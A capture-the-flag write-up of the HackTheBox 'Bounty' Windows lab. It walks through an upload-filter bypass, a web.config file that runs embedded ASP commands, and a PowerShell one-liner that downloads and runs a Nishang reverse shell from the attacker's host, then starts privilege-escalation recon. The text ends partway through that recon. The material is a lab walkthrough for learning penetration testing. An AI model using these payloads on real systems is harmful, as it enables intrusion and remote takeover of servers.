<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HTB - Bounty Write-up | bigb0ss</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB - Bounty Write-up" /><meta name="author" content="bigb0ss" /><meta property="og:locale" content="en_US" /><meta name="description" content="This was an easy difficulty Widnows box. Good learning path for: File Extension Bypass Allowed File Extension Checking (Python Scripting) web.config RCE Nishang (Invoke-PowerShellTcp.ps1) - Reverse Shell Juicy Potato (SeImpersonatePrivilege Abuse)" /><meta property="og:description" content="This was an easy difficulty Widnows box. Good learning path for: File Extension Bypass Allowed File Extension Checking (Python Scripting) web.config RCE Nishang (Invoke-PowerShellTcp.ps1) - Reverse Shell Juicy Potato (SeImpersonatePrivilege Abuse)" /><link rel="canonical" href="https://bigb0sss.github.io/posts/htb-bounty-writeup/" /><meta property="og:url" content="https://bigb0sss.github.io/posts/htb-bounty-writeup/" /><meta property="og:site_name" content="bigb0ss" /><meta property="og:image" content="https://bigb0sss.github.io/assets/img/post/htb/bounty/01_infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-15T10:36:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://bigb0sss.github.io/assets/img/post/htb/bounty/01_infocard.png" /><meta property="twitter:title" content="HTB - Bounty Write-up" /><meta name="twitter:site" content="@bigb0ss___" /><meta name="twitter:creator" content="@bigb0ss" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"bigb0ss"},"description":"This was an easy difficulty Widnows box. Good learning path for: File Extension Bypass Allowed File Extension Checking (Python Scripting) web.config RCE Nishang (Invoke-PowerShellTcp.ps1) - Reverse Shell Juicy Potato (SeImpersonatePrivilege Abuse)","@type":"BlogPosting","headline":"HTB - Bounty Write-up","dateModified":"2020-11-15T10:36:00-05:00","datePublished":"2020-11-15T10:36:00-05:00","url":"https://bigb0sss.github.io/posts/htb-bounty-writeup/","image":"https://bigb0sss.github.io/assets/img/post/htb/bounty/01_infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://bigb0sss.github.io/posts/htb-bounty-writeup/"},"@context":"https://schema.org"}</script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script src="/assets/js/post.min.js" async></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-QE26N8SZTJ"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QE26N8SZTJ'); </script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/bigb0ss/bigb0ss.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">bigb0ss</a></div><div class="site-subtitle font-italic">OSCE | OSCP | Security Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.linkedin.com/in/danielsmin" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/bigb0sss" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bigb0ss___" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB - Bounty Write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Bounty Write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 15, 2020" > Nov 15 <i class="unloaded">2020-11-15T10:36:00-05:00</i> </span> by <span class="author"> bigb0ss </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/01_infocard.png" class="post-preview-img"><p>This was an easy difficulty Widnows box. Good learning path for:</p><ul><li>File Extension Bypass<li>Allowed File Extension Checking (Python Scripting)<li>web.config RCE<li>Nishang (Invoke-PowerShellTcp.ps1) - Reverse Shell<li>Juicy Potato (SeImpersonatePrivilege Abuse)</ul><h2 id="initial-recon">Initial Recon</h2><h3 id="nmap">Nmap</h3><p>Let’s begin with an initial port scan:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> 10.10.10.93
<span class="go">
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
</span><span class="gp">Service Info: OS: Windows;</span><span class="w"> </span>CPE: cpe:/o:microsoft:windows
</pre></table></code></div></div><p><b>Interesting Ports to Note</b></p><ul><li>HTTP (80/TCP) - IIS 7.5 web server. Main page only contains an image file.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/02.png" alt="image" /></p><h3 id="web-directory-enumeration-dirsearch">Web Directory Enumeration (dirsearch)</h3><p>Next, we can do web directory enumeration using <code class="language-plaintext highlighter-rouge">dirsearch</code>.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 dirsearch.py <span class="nt">-u</span> http://10.10.10.93/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-e</span> asp,aspx,txt,html | <span class="nb">grep</span> <span class="s1">'200\|301\|302'</span>
<span class="go">[19:28:07] 200 -  630B  - /
</span><span class="gp">[19:32:48] 301 -  156B  - /UploadedFiles  -&gt;</span><span class="w">  </span>http://10.10.10.93/UploadedFiles/   
<span class="gp">[19:33:50] 301 -  156B  - /uploadedFiles  -&gt;</span><span class="w">  </span>http://10.10.10.93/uploadedFiles/
<span class="gp">[19:37:56] 200 -  974B  - /transfer.aspx  -&gt;</span><span class="w">  </span>/transfer.aspx
</pre></table></code></div></div><h2 id="initial-foothold">Initial Foothold</h2><h3 id="file-upload-extension-bypass">File Upload Extension Bypass</h3><p><code class="language-plaintext highlighter-rouge">http://10.10.10.93/transfer.aspx</code> is the file upload functionality. It was implemented with some type of file extension filtering. However, we are allowed to upload image extenstions like <code class="language-plaintext highlighter-rouge">.jpg</code> or <code class="language-plaintext highlighter-rouge">.png</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/03-1.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/03.png" alt="image" /></p><p>Once the file is successfully uploaded, we can browse that file by specifying the full path as following <i>(Note: the image file is not diaplying in this example because it was not correct image file)</i>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/04.png" alt="image" /></p><p><b>ASPX Webshell</b></p><p>Next, we can try to upload a webshell (.ASPX) leveraging one of the file extension bypass technique, <code class="language-plaintext highlighter-rouge">%00</code> null byte. We can use a webshell that comes with Kali <code class="language-plaintext highlighter-rouge">cp /usr/share/webshells/aspx/cmdasp.aspx bigb0ss.aspx</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/05.png" alt="image" /></p><p>It was successful to bypass the filtering to upload the <code class="language-plaintext highlighter-rouge">bigb0ss.aspx</code> script; however, when we try to browse the file in the <code class="language-plaintext highlighter-rouge">/uploadedfile</code> directory we get a 404 page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/06.png" alt="image" /></p><h3 id="allowed-file-extension-check">Allowed File Extension Check</h3><p>Next, let’s do more thorough analysis on which file extensions are allowed VS. not. We can create a simple list of popular file extensions, such as below:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>extension.txt 
<span class="go">png
jpg
php
php5
php7
phtml
txt
html
asp
aspx
exe
config
js
</span></pre></table></code></div></div><p>Then, I created the following <code class="language-plaintext highlighter-rouge">checker.py</code> script to audit which file extensions are allowed:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>


<span class="n">url</span> <span class="o">=</span> <span class="s">"http://10.10.10.93/transfer.aspx"</span>
<span class="n">filename</span> <span class="o">=</span> <span class="s">"extension.txt"</span>

<span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="c1">#if r.status_code == 200:
</span>    <span class="c1">#    print("[INFO] Checking...{0}".format(f))
</span>    <span class="c1">#else:
</span>    <span class="c1">#    print("[ERROR] Can't connect...")
</span>    <span class="c1">#    sys.exit(1)
</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="s">"html.parser"</span><span class="p">)</span>

    <span class="n">viewState</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">attrs</span> <span class="o">=</span> <span class="p">{</span><span class="s">'name'</span> <span class="p">:</span> <span class="s">'__VIEWSTATE'</span><span class="p">})[</span><span class="s">'value'</span><span class="p">]</span>
    <span class="n">eventValidation</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">attrs</span> <span class="o">=</span> <span class="p">{</span><span class="s">'name'</span> <span class="p">:</span> <span class="s">'__EVENTVALIDATION'</span><span class="p">})[</span><span class="s">'value'</span><span class="p">]</span>

    <span class="n">postData</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">'__VIEWSTATE'</span> <span class="p">:</span> <span class="n">viewState</span><span class="p">,</span>
            <span class="s">'__EVENTVALIDATION'</span> <span class="p">:</span> <span class="n">eventValidation</span><span class="p">,</span>
            <span class="s">'btnUpload'</span> <span class="p">:</span> <span class="s">'Upload'</span>
            <span class="p">}</span>

    <span class="n">uploadedFile</span> <span class="o">=</span> <span class="p">{</span><span class="s">'FileUpload1'</span> <span class="p">:</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">'test'</span><span class="p">)}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">uploadedFile</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">postData</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[INFO] Allowed Extensions:"</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'r'</span><span class="p">):</span>
    <span class="c1">#print(i[:-1])
</span>    <span class="n">response</span> <span class="o">=</span> <span class="n">upload</span><span class="p">(</span><span class="s">'bigb0ss.'</span> <span class="o">+</span> <span class="n">i</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">if</span> <span class="s">"successfully"</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[+] %s"</span> <span class="o">%</span> <span class="n">i</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
</pre></table></code></div></div><p>It resulted in identifying that <code class="language-plaintext highlighter-rouge">config</code> file extension is also allowed.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 checker.py 
<span class="go">[INFO] Allowed Extensions:
[+] png
[+] jpg
[+] config
</span></pre></table></code></div></div><h3 id="webconfig-rce">web.config (RCE)</h3><p>It turned out to be we can upload a <code class="language-plaintext highlighter-rouge">web.config</code> file and from <a href="https://soroush.secproject.com/blog/">this post</a>, we can find a POC script to cause RCE. This script will simple print out <code class="language-plaintext highlighter-rouge">3</code> if we could cause an RCE using the following <code class="language-plaintext highlighter-rouge">web.config</code> file:</p><blockquote><p><strong>NOTE</strong>: The web.config file plays an important role in storing IIS7 (and higher) settings. It is very similar to a .htaccess file in Apache web server. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique.</p></blockquote><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;configuration&gt;</span>
   <span class="nt">&lt;system.webServer&gt;</span>
      <span class="nt">&lt;handlers</span> <span class="na">accessPolicy=</span><span class="s">"Read, Script, Write"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;add</span> <span class="na">name=</span><span class="s">"web_config"</span> <span class="na">path=</span><span class="s">"*.config"</span> <span class="na">verb=</span><span class="s">"*"</span> <span class="na">modules=</span><span class="s">"IsapiModule"</span> <span class="na">scriptProcessor=</span><span class="s">"%windir%\system32\inetsrv\asp.dll"</span> <span class="na">resourceType=</span><span class="s">"Unspecified"</span> <span class="na">requireAccess=</span><span class="s">"Write"</span> <span class="na">preCondition=</span><span class="s">"bitness64"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;/handlers&gt;</span>
      <span class="nt">&lt;security&gt;</span>
         <span class="nt">&lt;requestFiltering&gt;</span>
            <span class="nt">&lt;fileExtensions&gt;</span>
               <span class="nt">&lt;remove</span> <span class="na">fileExtension=</span><span class="s">".config"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;/fileExtensions&gt;</span>
            <span class="nt">&lt;hiddenSegments&gt;</span>
               <span class="nt">&lt;remove</span> <span class="na">segment=</span><span class="s">"web.config"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;/hiddenSegments&gt;</span>
         <span class="nt">&lt;/requestFiltering&gt;</span>
      <span class="nt">&lt;/security&gt;</span>
   <span class="nt">&lt;/system.webServer&gt;</span>
   <span class="nt">&lt;appSettings&gt;</span>
<span class="nt">&lt;/appSettings&gt;</span>
<span class="nt">&lt;/configuration&gt;</span>
<span class="c">&lt;!-- ASP code comes here
&lt;%
Response.write("-"&amp;"-&gt;")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("&lt;!-"&amp;"-")
%&gt;
--&gt;</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/07.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/08.png" alt="image" /></p><p>When we visite the page <code class="language-plaintext highlighter-rouge">http://10.10.10.93/UploadedFiles/web.config</code> on our browser, we can see the number 3 that was calculation from <code class="language-plaintext highlighter-rouge">Response.write(1+2)</code> this part of the script.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/09.png" alt="image" /></p><p>Next, let’s update the POC script a bit to see if we can execuate any OS command.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- ASP code comes here
&lt;%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%&gt;
--&gt;</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/10.png" alt="image" /></p><h3 id="webconfig-reverse-shell">web.config (Reverse Shell)</h3><p>Now, we can use <code class="language-plaintext highlighter-rouge">Nishang</code>’s <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code> to gain a reverse shell.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cp</span> /opt/windows/nishang/Shells/Invoke-PowerShellTcp.ps1 revShell.ps1
<span class="gp">$</span><span class="w"> </span>vi revShell.ps1
</pre></table></code></div></div><p>At the bottom of the script add the following command:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-PowerShellTcp</span><span class="w"> </span><span class="nt">-Reverse</span><span class="w"> </span><span class="nt">-IPAddress</span><span class="w"> </span><span class="nx">10.10.14.25</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="nx">9001</span><span class="w">
</span></pre></table></code></div></div><p>Let’s update the <code class="language-plaintext highlighter-rouge">web.config</code> file again to execute our reverse shell script from our web server.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- ASP code comes here
&lt;%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.25/revShell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%&gt;
--&gt;</span>
</pre></table></code></div></div><p>Once we uploaded the updated <code class="language-plaintext highlighter-rouge">web.config</code> and visit the url, we can successfully gain a reverse shell from the host.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/11.png" alt="image" /></p><p><b>user.txt</b></p><p>Initially, when we go to <code class="language-plaintext highlighter-rouge">c:\Users\merlin\Desktop</code>, it is empty. However, using PS command like <code class="language-plaintext highlighter-rouge">dir -force</code> or <code class="language-plaintext highlighter-rouge">attrib</code> we can view the hidden files. We can find the <code class="language-plaintext highlighter-rouge">user.txt</code> flag here.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="gp">PS C:\users\merlin\Desktop&gt;</span><span class="w"> </span><span class="nb">dir</span> <span class="nt">-force</span>
<span class="go">

    Directory: C:\users\merlin\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
-a-h-         5/30/2018  11:32 PM         32 user.txt                          


</span><span class="gp">PS C:\users\merlin\Desktop&gt;</span><span class="w"> </span>more user.txt
<span class="go">e29a***REDACTED***4a2f

</span></pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="merlin--administrator-juicy-potato">merlin —&gt; administrator (Juicy Potato)</h3><p>A quick <code class="language-plaintext highlighter-rouge">systeminfo</code> command shows that this box is Server 2008 R2 without Hotfix(s). It would be likely vulnerable to some of knwon kernel exploit.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="gp">PS C:\users\merlin\Desktop&gt;</span><span class="w"> </span>systeminfo
<span class="go">
Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          11/16/2020, 1:48:20 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
</span><span class="gp">System Locale:             en-us;</span>English <span class="o">(</span>United States<span class="o">)</span>
<span class="gp">Input Locale:              en-us;</span>English <span class="o">(</span>United States<span class="o">)</span>
<span class="go">Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,547 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,583 MB
Virtual Memory: In Use:    512 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
</span></pre></table></code></div></div><p>Another command we also need to check is <code class="language-plaintext highlighter-rouge">whoami /priv</code> for any low-hanging fruits.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">PS C:\users\merlin\Desktop&gt;</span><span class="w"> </span><span class="nb">whoami</span> /priv
<span class="go">
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
